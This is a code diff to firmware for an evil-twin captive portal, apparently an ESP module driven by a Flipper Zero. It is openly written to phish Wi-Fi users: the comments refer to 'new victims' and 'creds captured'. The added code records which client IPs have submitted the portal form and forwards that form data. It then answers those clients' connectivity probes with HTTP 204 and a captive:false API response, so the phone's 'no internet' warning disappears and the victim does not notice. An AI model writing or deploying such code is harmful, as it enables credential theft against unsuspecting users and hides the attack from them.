@@ -244,6 +244,21 @@ void handleRedirect(WiFiClient &client) {
   client.write(response.c_str());
 }
 
+// Per-client captive state: once a client submits the portal form it's "authorized",
+// and we answer ITS OS connectivity probes with 204 (No Content) so the
+// "Connected, no internet" warning clears. Un-authorized clients still get a 302 to
+// the portal, so it keeps popping for new victims. Peer IP via WiFiClient::remoteIP()
+// (core patch -> lwip_getpeername).
+static uint32_t authed_ips[16];
+static uint8_t authed_n = 0;
+bool ip_is_authed(uint32_t ip) { for (uint8_t i = 0; i < authed_n; i++) if (authed_ips[i] == ip) return true; return false; }
+void ip_mark_authed(uint32_t ip) { if (ip && !ip_is_authed(ip)) { authed_ips[authed_n % 16] = ip; if (authed_n < 16) authed_n++; } }
+
+void handle204(WiFiClient &client) {
+  // 204 = probe succeeded -> OS marks the network validated and drops the warning.
+  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n");
+}
+
 void handle404(WiFiClient &client) {
   String body = "Not found!";
   String response = makeResponse(404, "text/plain", false, body.length());
@@ -366,11 +381,19 @@ uint32_t current_num = 0;
 
 void loop() {
   while (Serial1.available()) {
-    delay(3);  //delay to allow buffer to fill 
+    delay(3);  //delay to allow buffer to fill
     if (Serial1.available() >0) {
       char c = Serial1.read();  //gets one byte from serial buffer
       readString += c; //makes the string readString
-    } 
+    }
+  }
+  // Also accept the same commands over USB (Serial/CH340) so the board can be driven
+  // from a host for testing without the Flipper attached. Same readString pipeline.
+  while (Serial.available()) {
+    delay(3);
+    if (Serial.available() > 0) {
+      readString += (char)Serial.read();
+    }
   }
   if(readString.length()>0){
     if(readString.substring(0,4)=="SCAN"){
@@ -662,10 +685,14 @@ void loop() {
             }
             String path = parseRequest(request);
             Serial.println(request);
+            uint32_t cip = (uint32_t)client.remoteIP();
+            bool authed = ip_is_authed(cip);
+            Serial.print("CIP="); Serial.print(cip, HEX); Serial.print(" authed="); Serial.println(authed);
             // RFC 8908 Captive-Portal API endpoint that DHCP option 114 points at.
             // Android's NetworkMonitor fetches this expecting application/captive+json.
+            // Report captive:false once this client is authorized so the OS clears the warning.
             if(path.startsWith("/cp.json")){
-              String j = "{\"captive\":true,\"user-portal-url\":\"http://192.168.4.1/\"}";
+              String j = String("{\"captive\":") + (authed ? "false" : "true") + ",\"user-portal-url\":\"http://192.168.4.1/\"}";
               String resp = makeResponse(200, "application/captive+json", false, j.length());
               resp += j;
               client.write(resp.c_str());
@@ -683,10 +710,12 @@ void loop() {
                 if (datos.length() > 0) {
                   Serial1.print("EV:");
                   Serial1.println(datos);
+                  ip_mark_authed(cip);   // creds captured -> clear this client's no-internet warning
                 }
               }
           }else{
-            handleRedirect(client);
+            // Probe / unknown URL: authorized client -> 204 (clears warning); else 302 to portal.
+            if(authed) handle204(client); else handleRedirect(client);
           }
           break;
 
